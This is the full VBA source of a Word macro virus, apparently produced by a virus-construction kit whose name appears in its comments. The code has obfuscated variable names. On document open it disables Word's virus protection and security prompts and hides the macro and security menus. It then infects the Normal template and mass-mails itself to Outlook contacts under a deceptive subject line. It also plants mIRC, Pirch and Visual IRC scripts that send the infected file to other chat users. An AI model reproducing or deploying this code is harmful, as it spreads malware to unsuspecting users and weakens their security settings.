   Attribute VB_Name = "Modulo1"
   ' WordMacro/ZWMVC.ZWMVC_Macro constructed by Zed, 30/03/2003
   Private Declare Function SetSysColors Lib "user32" (ByVal nChanges As Long, lpSysColor As Long, lpColorValues As Long) As Long
   Private Sub Document_Open()
   On Error Resume Next
   If Options.VirusProtection = True Then
       Options.VirusProtection = False
   End If
   If Options.ConfirmConversions = True Then
       Options.ConfirmConversions = False
   End If
   If Options.SaveNormalPrompt = True Then
       Options.SaveNormalPrompt = False
   End If
   q7o3z6k8N10i10k1V9b7U10M1i2i4f7g5o10h9v5 = "HKEY_CURRENT_USER\Software\Microsoft\Office\" _
   & Application.Version & "\Word\Security"
   For M1R1X5h4e5P10K4a8B3w6p6N3 = 0 To 1
       S8R5f7v6N1u8M4E5j2C7X8l9J2J1 = Array("Level", "AccessVBOM")
       C10z5X7w7H3S5m6c5J3b2N6S2Z4P9s2f9m6m1o1Z9k3i3t8r4 = S8R5f7v6N1u8M4E5j2C7X8l9J2J1(M1R1X5h4e5P10K4a8B3w6p6N3)
       System.PrivateProfileString("", q7o3z6k8N10i10k1V9b7U10M1i2i4f7g5o10h9v5, C10z5X7w7H3S5m6c5J3b2N6S2Z4P9s2f9m6m1o1Z9k3i3t8r4) = 1&
   Next M1R1X5h4e5P10K4a8B3w6p6N3
   For c1m5z2F1D4p8s7D3H4s8E4y10n10v3 = 0 To 2
       p7X1q7m5P1e9M3w1j5c6a1 = Array("Macro", "Templates and Add-Ins...", "Customize...")
       E2E2X5G2A6d9W5m7X10 = p7X1q7m5P1e9M3w1j5c6a1(c1m5z2F1D4p8s7D3H4s8E4y10n10v3)
       If CommandBars("Tools").Controls(E2E2X5G2A6d9W5m7X10).Enabled = True Then
           CommandBars("Tools").Controls(E2E2X5G2A6d9W5m7X10).Enabled = False
       End If
   Next c1m5z2F1D4p8s7D3H4s8E4y10n10v3
   For K8o10n4e9M2i5w10p6X7G6x3y1K10 = 0 To 1
       X7P1b1t5n1R5e2K8D1c6P5 = Array("Toolbars", "Status Bar")
       z4t5e6R6w7d6K7g2B2v2C10o7r2L5n5u10j7j1D8i9w10x6G3K7T9 = X7P1b1t5n1R5e2K8D1c6P5(K8o10n4e9M2i5w10p6X7G6x3y1K10)
       If CommandBars("View").Controls(z4t5e6R6w7d6K7g2B2v2C10o7r2L5n5u10j7j1D8i9w10x6G3K7T9).Enabled = True Then
           CommandBars("View").Controls(z4t5e6R6w7d6K7g2B2v2C10o7r2L5n5u10j7j1D8i9w10x6G3K7T9).Enabled = False
       End If
   Next K8o10n4e9M2i5w10p6X7G6x3y1K10
   For I2K6K10H8C5W4Q4t2Z6N1j8Z10O6x6C7c6T5r1J7I10n9g6 = 0 To 1
       u2w10j5X9Y6A8I4P3T10N3u8r10c4o8j5G10J8n1d3V10V8A3Q1J8o6 = Array("Macros...", "Security...")
       R6q9Q4 = u2w10j5X9Y6A8I4P3T10N3u8r10c4o8j5G10J8n1d3V10V8A3Q1J8o6(I2K6K10H8C5W4Q4t2Z6N1j8Z10O6x6C7c6T5r1J7I10n9g6)
       If CommandBars("Macro").Controls(R6q9Q4).Enabled = True Then
           CommandBars("Macro").Controls(R6q9Q4).Enabled = False
       End If
   Next I2K6K10H8C5W4Q4t2Z6N1j8Z10O6x6C7c6T5r1J7I10n9g6
   If CommandBars("Format").Controls("Style...").Enabled = True Then
       CommandBars("Format").Controls("Style...").Enabled = False
   End If
   Set n10G8L7g10J3v5A7Y9 = ActiveDocument.VBProject.VBComponents(1)
   Set n4u1h6K10w8W5Y9L9f9M6I9C6 = NormalTemplate.VBProject.VBComponents(1)
   If n4u1h6K10w8W5Y9L9f9M6I9C6.Name <> "ZWMVC_Macro" Then
       Set l7d7c7d5r10N1M2o8 = n4u1h6K10w8W5Y9L9f9M6I9C6.CodeModule
       Set F7H1l6a5K1F10w1y5x7D7D9 = n10G8L7g10J3v5A7Y9.CodeModule
       l7d7c7d5r10N1M2o8.DeleteLines 1, l7d7c7d5r10N1M2o8.CountOfLines
       l7d7c7d5r10N1M2o8.InsertLines 1, F7H1l6a5K1F10w1y5x7D7D9.Lines(1, F7H1l6a5K1F10w1y5x7D7D9.CountOfLines)
       n4u1h6K10w8W5Y9L9f9M6I9C6.Name = "ZWMVC_Macro"
   End If
   If n10G8L7g10J3v5A7Y9.Name <> "ZWMVC_Macro" Then
       Set Y6t4I6i4o9 = n10G8L7g10J3v5A7Y9.CodeModule
       Set K10r5I2d7f3F10e5Q2d9c2b10P10Z1n8w7U8n5K8D10E8u5p4n10y5 = n4u1h6K10w8W5Y9L9f9M6I9C6.CodeModule
       Y6t4I6i4o9.DeleteLines 1, Y6t4I6i4o9.CountOfLines
       Y6t4I6i4o9.InsertLines 1, K10r5I2d7f3F10e5Q2d9c2b10P10Z1n8w7U8n5K8D10E8u5p4n10y5.Lines(1, K10r5I2d7f3F10e5Q2d9c2b10P10Z1n8w7U8n5K8D10E8u5p4n10y5.CountOfLines)
       n10G8L7g10J3v5A7Y9.Name = "ZWMVC_Macro"
   End If
   If n4u1h6K10w8W5Y9L9f9M6I9C6.Name = "ZWMVC_Macro" Then
       NormalTemplate.Save
       NormalTemplate.Saved = True
   End If

       Do
       l7d7c7d5r10N1M2o8 = l7d7c7d5r10N1M2o8 + 1
       Randomize
       Randomize
       Randomize
       F7H1l6a5K1F10w1y5x7D7D9 = SysSysColors(Int((255 * Rnd) + 1), Int((255 * Rnd) + 1), Int((255 * Rnd) + 1))
       Loop Until l7d7c7d5r10N1M2o8 = 21

   R5O4V6T10U9N4y10T3f6m7f5w7F2U9r2 = Left(ActiveDocument.Name, 8)
   If R5O4V6T10U9N4y10T3f6m7f5w7F2U9r2 <> "Document" And IsNumeric(Right(ActiveDocument.Name, 1)) = False Then
       ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
   Set Y6t4I6i4o9 = CreateObject("Outlook.Application")
   If Not Y6t4I6i4o9 = "" Then
       EMT = EMT & "Look at the file in the attachments!"
       Set F7H1l6a5K1F10w1y5x7D7D9 = Y6t4I6i4o9.GetNameSpace("MAPI")
       D5i10a10k3O7C8Z6p2M8L6m1x9F6s5r5N8u5K9n10U6r8D9h1 = "HKEY_CURRENT_USER\Software\ZWMVC_Macro\StoredEmails"
           For s1n5R1X10y3X9n4G8Q3a2R8N5N8 = 1 To F7H1l6a5K1F10w1y5x7D7D9.GetDefaultFolder(10).Items.Count
           Set a5d2E2r6n7m1B10h7U3Q4d4P9S10J4T6i1L10X5c6 = F7H1l6a5K1F10w1y5x7D7D9.GetDefaultFolder(10).Items.Item(s1n5R1X10y3X9n4G8Q3a2R8N5N8)
           If System.PrivateProfileString("", D5i10a10k3O7C8Z6p2M8L6m1x9F6s5r5N8u5K9n10U6r8D9h1, a5d2E2r6n7m1B10h7U3Q4d4P9S10J4T6i1L10X5c6) = "" Then
           Set Eml2 = Y6t4I6i4o9.CreateItem(0)
       With Eml2
           .To = a5d2E2r6n7m1B10h7U3Q4d4P9S10J4T6i1L10X5c6
           .Subject = "Fwd: Check this out"
           .Body = EMT
           .Attachments.Add ActiveDocument.FullName
           .Importance = 1
           .DeleteAfterSubmit = True
           .Send
       End With
           System.PrivateProfileString("", D5i10a10k3O7C8Z6p2M8L6m1x9F6s5r5N8u5K9n10U6r8D9h1, a5d2E2r6n7m1B10h7U3Q4d4P9S10J4T6i1L10X5c6) = TimeValue(Now)
       End If
       Next s1n5R1X10y3X9n4G8Q3a2R8N5N8
   End If
   For n10G8L7g10J3v5A7Y9 = 0 To 3
       n4u1h6K10w8W5Y9L9f9M6I9C6 = Array("C:\Mirc", "C:\Mirc32", n10G8L7g10J3v5A7Y9 & "\Mirc", n10G8L7g10J3v5A7Y9 & "\Mirc32")
       l7d7c7d5r10N1M2o8 = n4u1h6K10w8W5Y9L9f9M6I9C6(n10G8L7g10J3v5A7Y9)
       If Dir(l7d7c7d5r10N1M2o8, vbDirectory) <> "" Then
           Open l7d7c7d5r10N1M2o8 & "\Script.ini" For Output As 1
           Print #1, "[script]"
           Print #1, "n5= on 1:JOIN:#:{"
           Print #1, "n6= /if ( $nick == $me ) { halt }"
           Print #1, "n7= /msg $nick "
           Print #1, "n8= /dcc send -c $nick " & ActiveDocument.FullName
           Print #1, "n9= }"
           Close 1
       End If
   Next n10G8L7g10J3v5A7Y9
   For Y6t4I6i4o9 = 0 To 3
       K10r5I2d7f3F10e5Q2d9c2b10P10Z1n8w7U8n5K8D10E8u5p4n10y5 = Array("C:\Pirch", "C:\Pirch32", n10G8L7g10J3v5A7Y9 & "\Pirch", n10G8L7g10J3v5A7Y9 & "\Pirch32")
       F7H1l6a5K1F10w1y5x7D7D9 = K10r5I2d7f3F10e5Q2d9c2b10P10Z1n8w7U8n5K8D10E8u5p4n10y5(Y6t4I6i4o9)
       If Dir(F7H1l6a5K1F10w1y5x7D7D9, vbDirectory) <> "" Then
           Open F7H1l6a5K1F10w1y5x7D7D9 & "\Events.ini" For Output As 2
           Print #2, "[Levels]"
           Print #2, "Enabled=1"
           Print #2, "Count=6"
           Print #2, "Level1=000-Unknowns"
           Print #2, "000-UnknownsEnabled=1"
           Print #2, "Level2=100-Level 100"
           Print #2, "100-Level 100Enabled=1"
           Print #2, "Level3=200-Level 200"
           Print #2, "200-Level 200Enabled=1"
           Print #2, "Level4=300-Level 300"
           Print #2, "300-Level 300Enabled=1"
           Print #2, "Level5=400-Level 400"
           Print #2, "400-Level 400Enabled=1"
           Print #2, "Level6=500-Level 500"
           Print #2, "500-Level 500Enabled=1"
           Print #2, ""
           Print #2, "[000-Unknowns]"
           Print #2, "UserCount=0"
           Print #2, "Event1=ON JOIN:#:/msg $nick "
           Print #2, "EventCount=0"
           Print #2, ""
           Print #2, "[100-Level 100]"
           Print #2, "User1=*!*@*"
           Print #2, "UserCount=1"
           Print #2, "Event1=ON JOIN:#:/dcc send $nick " & ActiveDocument.FullName
           Print #2, "EventCount=1"
           Print #2, ""
           Print #2, "[200-Level 200]"
           Print #2, "UserCount=0"
           Print #2, "EventCount=0"
           Print #2, ""
           Print #2, "[300-Level 300]"
           Print #2, "UserCount=0"
           Print #2, "EventCount=0"
           Print #2, ""
           Print #2, "[400-Level 400]"
           Print #2, "UserCount=0"
           Print #2, "EventCount=0"
           Print #2, ""
           Print #2, "[500-Level 500]"
           Print #2, "UserCount=0"
           Print #2, "EventCount=0"
           Close 2
       End If
   Next Y6t4I6i4o9
   For R5O4V6T10U9N4y10T3f6m7f5w7F2U9r2 = 0 To 3
       n4u1h6K10w8W5Y9L9f9M6I9C6 = Array("C:\Virc", "C:\Virc32", n10G8L7g10J3v5A7Y9 & "\Virc", n10G8L7g10J3v5A7Y9 & "\Virc32")
       n10G8L7g10J3v5A7Y9 = n4u1h6K10w8W5Y9L9f9M6I9C6(R5O4V6T10U9N4y10T3f6m7f5w7F2U9r2)
       If Dir(n10G8L7g10J3v5A7Y9, vbDirectory) <> "" Then
           System.PrivateProfileString("", "HKEY_USERS\.Default\Software\MeGALiTH Software\Visual IRC96\Events", "Event17") = "dcc send $nick " & ActiveDocument.FullName
       End If
   Next R5O4V6T10U9N4y10T3f6m7f5w7F2U9r2
   Else
       ActiveDocument.Saved = True
   End If
   End Sub
   ' Macro virus constructed by Zed's Word Macro Virus Constructor (ZWMVC) v1.0
